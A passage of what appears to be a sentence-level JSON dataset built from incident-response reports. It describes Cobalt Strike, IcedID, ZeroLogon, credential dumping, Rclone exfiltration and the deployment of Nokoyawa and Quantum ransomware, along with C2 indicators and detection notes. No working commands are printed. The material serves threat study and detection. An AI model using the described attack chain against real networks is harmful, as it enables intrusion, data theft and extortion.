        "line": 135,
        "index": 3828
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S136",
        "text": "Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081.",
        "type": "",
        "report": "r-dfir-2",
        "line": 136,
        "index": 3829
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S137",
        "text": "Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).",
        "type": "",
        "report": "r-dfir-2",
        "line": 137,
        "index": 3830
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S138",
        "text": "Below is a screenshot of a packet captured from C2 traffic over HTTP.",
        "type": "",
        "report": "r-dfir-2",
        "line": 138,
        "index": 3831
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S139",
        "text": "Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232) are seen:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 139,
        "index": 3832
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S140",
        "text": "During the intrusion, the threat actors targeted password documents on network shares.",
        "type": "",
        "report": "r-dfir-2",
        "line": 140,
        "index": 3833
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S141",
        "text": "We observed these being taken and opened off network through the use of canaries.",
        "type": "",
        "report": "r-dfir-2",
        "line": 141,
        "index": 3834
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S142",
        "text": "No overt exfiltration was observed so we assess that this occurred over existing command and control channels.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 142,
        "index": 3835
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S143",
        "text": "The threat actors opened the document from the IP:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 143,
        "index": 3836
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S144",
        "text": "Threat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec.",
        "type": "",
        "report": "r-dfir-2",
        "line": 144,
        "index": 3837
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S145",
        "text": "They first copied the ransomware binary,k.exe, and a batch script p.bat using WMI:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 145,
        "index": 3838
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S146",
        "text": "Command spawned by WmiPrvSE.exe:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 146,
        "index": 3839
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S147",
        "text": "A snippet of SMB network traffic generated by the above command:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 147,
        "index": 3840
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S148",
        "text": "The p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 148,
        "index": 3841
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S149",
        "text": "The redacted parameter used by the `\u2013config` flag decodes to:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 149,
        "index": 3842
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S150",
        "text": "The decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64.",
        "type": "",
        "report": "r-dfir-2",
        "line": 150,
        "index": 3843
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S151",
        "text": "The threat actors also configured a number of directories and extensions to skip, and enabled network and hidden drives encryption.",
        "type": "",
        "report": "r-dfir-2",
        "line": 151,
        "index": 3844
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S152",
        "text": "The DELETE_SHADOW was set to true, in order to delete volume shadow copies.",
        "type": "",
        "report": "r-dfir-2",
        "line": 152,
        "index": 3845
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S153",
        "text": "Based on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the 1.1 version of the Nokoyawa code base:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 153,
        "index": 3846
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S154",
        "text": "Ransomware sample code signature:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 154,
        "index": 3847
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S155",
        "text": "Debug information shows that the binary was generated a few hours before the encryption:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 155,
        "index": 3848
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S156",
        "text": "The ransomware was then deployed at scale using PsExec to encrypt the Windows domain:\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 156,
        "index": 3849
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S157",
        "text": "A ransom message was left in each directory where files were encrypted.\n",
        "type": "",
        "report": "r-dfir-2",
        "line": 157,
        "index": 3850
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S158",
        "text": "After encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in Bitcoin.",
        "type": "",
        "report": "r-dfir-2",
        "line": 158,
        "index": 3851
    },
    {
        "id": "dfir-reports-filtered/r-dfir-2.md:::S159",
        "text": "No ransom was paid as a result of this intrusion.",
        "type": "",
        "report": "r-dfir-2",
        "line": 159,
        "index": 3852
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S0",
        "text": "The ISO image delivered a hidden directory containing a IcedID payload and a batch file.",
        "type": "",
        "report": "r-dfir-3",
        "line": 0,
        "index": 3853
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S1",
        "text": "After being successfully mounted (double clicked), the end user only sees a malicious LNK file named documents inside the virtual hard drive.",
        "type": "",
        "report": "r-dfir-3",
        "line": 1,
        "index": 3854
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S2",
        "text": "Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user\u2019s AppData\\Local\\Temp folder and loads it using rundll32.",
        "type": "",
        "report": "r-dfir-3",
        "line": 2,
        "index": 3855
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S3",
        "text": "A scheduled task was created at that time to maintain persistence on this host as well.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 3,
        "index": 3856
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S4",
        "text": "Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.",
        "type": "",
        "report": "r-dfir-3",
        "line": 4,
        "index": 3857
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S5",
        "text": "Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware.",
        "type": "",
        "report": "r-dfir-3",
        "line": 5,
        "index": 3858
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S6",
        "text": "This led to another round of discovery using net followed by AdFind.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 6,
        "index": 3859
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S7",
        "text": "The threat actor installed Atera and Splashtop remote access software via an MSI file.",
        "type": "",
        "report": "r-dfir-3",
        "line": 7,
        "index": 3860
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S8",
        "text": "After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus.",
        "type": "",
        "report": "r-dfir-3",
        "line": 8,
        "index": 3861
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S9",
        "text": "The threat actor then proceeded to exploit CVE-2020-1472 (ZeroLogon).",
        "type": "",
        "report": "r-dfir-3",
        "line": 9,
        "index": 3862
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S10",
        "text": "This was followed by a batch script used to perform DNS lookups on hosts across the environment.",
        "type": "",
        "report": "r-dfir-3",
        "line": 10,
        "index": 3863
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S11",
        "text": "After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.",
        "type": "",
        "report": "r-dfir-3",
        "line": 11,
        "index": 3864
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S12",
        "text": "They then repeated the install of the remote access software package.",
        "type": "",
        "report": "r-dfir-3",
        "line": 12,
        "index": 3865
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S13",
        "text": "Some two hours later, another Cobalt Strike beacon was executed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 13,
        "index": 3866
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S14",
        "text": "With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.",
        "type": "",
        "report": "r-dfir-3",
        "line": 14,
        "index": 3867
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S15",
        "text": "Another round of activity took place using system tools, batch files, and Adget.",
        "type": "",
        "report": "r-dfir-3",
        "line": 15,
        "index": 3868
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S16",
        "text": "Several more beacons were also loaded on the host using DLLs and PowerShell.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 16,
        "index": 3869
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S17",
        "text": "At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems.",
        "type": "",
        "report": "r-dfir-3",
        "line": 17,
        "index": 3870
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S18",
        "text": "They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.",
        "type": "",
        "report": "r-dfir-3",
        "line": 18,
        "index": 3871
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S19",
        "text": "These actions, however, failed to get a beacon to launch on the domain controller being targeted.",
        "type": "",
        "report": "r-dfir-3",
        "line": 19,
        "index": 3872
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S20",
        "text": "After an hour or so of failures, the threat actors proceeded to RDP into the domain controller.",
        "type": "",
        "report": "r-dfir-3",
        "line": 20,
        "index": 3873
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S21",
        "text": "Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt.",
        "type": "",
        "report": "r-dfir-3",
        "line": 21,
        "index": 3874
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S22",
        "text": "Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).",
        "type": "",
        "report": "r-dfir-3",
        "line": 22,
        "index": 3875
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S23",
        "text": "These beacons, however, continued to crash and fail to run.",
        "type": "",
        "report": "r-dfir-3",
        "line": 23,
        "index": 3876
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S24",
        "text": "Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.",
        "type": "",
        "report": "r-dfir-3",
        "line": 24,
        "index": 3877
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S25",
        "text": "The Cobalt Strike beacons then began to execute successfully on the domain controller.",
        "type": "",
        "report": "r-dfir-3",
        "line": 25,
        "index": 3878
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S26",
        "text": "Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.",
        "type": "",
        "report": "r-dfir-3",
        "line": 26,
        "index": 3879
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S27",
        "text": "A few hours after, the threat actors installed the RSAT tools onto the beachhead host.",
        "type": "",
        "report": "r-dfir-3",
        "line": 27,
        "index": 3880
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S28",
        "text": "However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.",
        "type": "",
        "report": "r-dfir-3",
        "line": 28,
        "index": 3881
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S29",
        "text": "Back on the domain controller, ProcDump was used to dump LSASS memory.",
        "type": "",
        "report": "r-dfir-3",
        "line": 29,
        "index": 3882
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S30",
        "text": "The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.",
        "type": "",
        "report": "r-dfir-3",
        "line": 30,
        "index": 3883
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S31",
        "text": "The threat actors went quiet for around seven hours.",
        "type": "",
        "report": "r-dfir-3",
        "line": 31,
        "index": 3884
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S32",
        "text": "When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.",
        "type": "",
        "report": "r-dfir-3",
        "line": 32,
        "index": 3885
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S33",
        "text": "For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 33,
        "index": 3886
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S34",
        "text": "During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.",
        "type": "",
        "report": "r-dfir-3",
        "line": 34,
        "index": 3887
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S35",
        "text": "A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.",
        "type": "",
        "report": "r-dfir-3",
        "line": 35,
        "index": 3888
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S36",
        "text": "These discovery actions were completed several times again in other various batch files.",
        "type": "",
        "report": "r-dfir-3",
        "line": 36,
        "index": 3889
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S37",
        "text": "On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.",
        "type": "",
        "report": "r-dfir-3",
        "line": 37,
        "index": 3890
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S38",
        "text": "Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.",
        "type": "",
        "report": "r-dfir-3",
        "line": 38,
        "index": 3891
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S39",
        "text": "Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.",
        "type": "",
        "report": "r-dfir-3",
        "line": 39,
        "index": 3892
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S40",
        "text": "After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service.",
        "type": "",
        "report": "r-dfir-3",
        "line": 40,
        "index": 3893
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S41",
        "text": "The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 41,
        "index": 3894
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S42",
        "text": "Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.",
        "type": "",
        "report": "r-dfir-3",
        "line": 42,
        "index": 3895
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S43",
        "text": "This appeared to fail.",
        "type": "",
        "report": "r-dfir-3",
        "line": 43,
        "index": 3896
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S44",
        "text": "The threat actors then proceeded to execute the payload manually in several ways, across various hosts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 44,
        "index": 3897
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S45",
        "text": "Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 45,
        "index": 3898
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S46",
        "text": "Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.",
        "type": "",
        "report": "r-dfir-3",
        "line": 46,
        "index": 3899
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S47",
        "text": "The time to ransomware was just over 78 hours from the initial IcedID infection.",
        "type": "",
        "report": "r-dfir-3",
        "line": 47,
        "index": 3900
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S48",
        "text": "All domain joined systems were encrypted with Quantum ransomware.",
        "type": "",
        "report": "r-dfir-3",
        "line": 48,
        "index": 3901
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S49",
        "text": "This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder).",
        "type": "",
        "report": "r-dfir-3",
        "line": 49,
        "index": 3902
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S50",
        "text": "The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.",
        "type": "",
        "report": "r-dfir-3",
        "line": 50,
        "index": 3903
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S51",
        "text": "First, the user clicked on the ISO file, which created a new virtual hard drive disk.",
        "type": "",
        "report": "r-dfir-3",
        "line": 51,
        "index": 3904
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S52",
        "text": "Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 52,
        "index": 3905
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S53",
        "text": "This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.",
        "type": "",
        "report": "r-dfir-3",
        "line": 53,
        "index": 3906
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S54",
        "text": "As we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\\eyewear.bat.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 54,
        "index": 3907
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S55",
        "text": "As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 55,
        "index": 3908
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S56",
        "text": "The batch file eyewear.bat then executed two commands:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 56,
        "index": 3909
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S57",
        "text": "It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user\u2019s AppData\\Local\\Temp\\ folder :\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 57,
        "index": 3910
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S58",
        "text": "Then, DLL was executed using rundll32.exe :\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 58,
        "index": 3911
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S59",
        "text": "Want to block ISOs from automatically mounting when double clicked?",
        "type": "",
        "report": "r-dfir-3",
        "line": 59,
        "index": 3912
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S60",
        "text": "Check out Huntress\u2019s recent writeup.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 60,
        "index": 3913
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S61",
        "text": "On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 61,
        "index": 3914
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S62",
        "text": "After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.",
        "type": "",
        "report": "r-dfir-3",
        "line": 62,
        "index": 3915
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S63",
        "text": "A number of application crashes were observed across several compromised hosts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 63,
        "index": 3916
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S64",
        "text": "This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.",
        "type": "",
        "report": "r-dfir-3",
        "line": 64,
        "index": 3917
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S65",
        "text": "Application crashes are recorded in the Windows Application event log under Event ID 1000 and 1001.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 65,
        "index": 3918
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S66",
        "text": "The NSA Cyber Windows Event Monitoring Guidance, has the following statement:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 66,
        "index": 3919
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S67",
        "text": "Application crashes may warrant investigation to determine if the crash is malicious or benign.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 67,
        "index": 3920
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S68",
        "text": "In this case, the threat actors attempted to rectify the issue by deploying new beacons, renaming executable files by either appending a double extension or adding extra characters to the filename (i.e. lsass.exe to lsasss.exe).",
        "type": "",
        "report": "r-dfir-3",
        "line": 68,
        "index": 3921
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S69",
        "text": "Some of these crashes may have been in response to being detected by Microsoft Defender.",
        "type": "",
        "report": "r-dfir-3",
        "line": 69,
        "index": 3922
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S70",
        "text": "These signatures were found in the logs on various hosts.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 70,
        "index": 3923
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S71",
        "text": "There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.",
        "type": "",
        "report": "r-dfir-3",
        "line": 71,
        "index": 3924
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S72",
        "text": "Decoded from Base64:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 72,
        "index": 3925
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S73",
        "text": "The decoded PowerShell function is readable in the PowerShell logs:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 73,
        "index": 3926
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S74",
        "text": "The PowerShell script used is publicly available, and can be found here, along with the CNA script.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 74,
        "index": 3927
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S75",
        "text": "We were unable to ascertain the purpose of running this script or how it furthered the threat actor\u2019s goals.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 75,
        "index": 3928
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S76",
        "text": "IcedID created a DLL named Utucka.dll just after the initial execution.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 76,
        "index": 3929
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S77",
        "text": "A scheduled task was then created using this same DLL.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 77,
        "index": 3930
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S78",
        "text": "First execution was observed on Day 1 at 8:00 PM and was repeated every hour.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 78,
        "index": 3931
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S79",
        "text": "The named pipe impersonation technique was used multiple times on different hosts in order to get system privileges.",
        "type": "",
        "report": "r-dfir-3",
        "line": 79,
        "index": 3932
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S80",
        "text": "This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command.",
        "type": "",
        "report": "r-dfir-3",
        "line": 80,
        "index": 3933
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S81",
        "text": "As seen in the screenshot below, GetSystem creates a service and connects to a pipe.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 81,
        "index": 3934
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S82",
        "text": "The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\\SYSTEM account used to connect to the pipe.",
        "type": "",
        "report": "r-dfir-3",
        "line": 82,
        "index": 3935
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S83",
        "text": "The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, CAR-2021-02-002: Get System Elevation\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 83,
        "index": 3936
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S84",
        "text": "Multiple access to WinLogon with granted access 0x40 (PROCESS_DUP_HANDLE) were performed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 84,
        "index": 3937
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S85",
        "text": "Such access can be tracked with Sysmon event ID 10 (ProcessAccess).",
        "type": "",
        "report": "r-dfir-3",
        "line": 85,
        "index": 3938
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S86",
        "text": "As explained in this blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.",
        "type": "",
        "report": "r-dfir-3",
        "line": 86,
        "index": 3939
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S87",
        "text": "On the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller.",
        "type": "",
        "report": "r-dfir-3",
        "line": 87,
        "index": 3940
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S88",
        "text": "This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 88,
        "index": 3941
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S89",
        "text": "The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.",
        "type": "",
        "report": "r-dfir-3",
        "line": 89,
        "index": 3942
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S90",
        "text": "The threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment.",
        "type": "",
        "report": "r-dfir-3",
        "line": 90,
        "index": 3943
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S91",
        "text": "These packages are designed to evade controls such as Mark-of-the-Web restrictions.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 91,
        "index": 3944
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S92",
        "text": "On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 92,
        "index": 3945
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S93",
        "text": "This command was downloaded from a remote site to a file named pon!.txt and then executed locally.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 93,
        "index": 3946
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S94",
        "text": "Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.",
        "type": "",
        "report": "r-dfir-3",
        "line": 94,
        "index": 3947
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S95",
        "text": "This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim\u2019s computer.",
        "type": "",
        "report": "r-dfir-3",
        "line": 95,
        "index": 3948
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S96",
        "text": "As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 96,
        "index": 3949
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S97",
        "text": "The injection is also visible from memory dumps.",
        "type": "",
        "report": "r-dfir-3",
        "line": 97,
        "index": 3950
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S98",
        "text": "Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 98,
        "index": 3951
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S99",
        "text": "Many of these beacons could also be detected in memory scanning with the Malpedia Cobalt Strike rule.",
        "type": "",
        "report": "r-dfir-3",
        "line": 99,
        "index": 3952
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S100",
        "text": "A sample of a scanning run is displayed below:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 100,
        "index": 3953
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S101",
        "text": "Multiple tools and scripts were used to access and collect credentials from compromised hosts.",
        "type": "",
        "report": "r-dfir-3",
        "line": 101,
        "index": 3954
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S102",
        "text": "There were several variants of Mimikatz in binary and PowerShell form:\n",
        "type": "",
        "report": "r-dfir-3",
        "line": 102,
        "index": 3955
    },
    {
        "id": "dfir-reports-filtered/r-dfir-3.md:::S103",
        "text": "Commands used to collect credentials and export to text files stored in the C:\\ProgramData folder included the following:\n",
        "type": "",
        "report": "r-dfir-3",
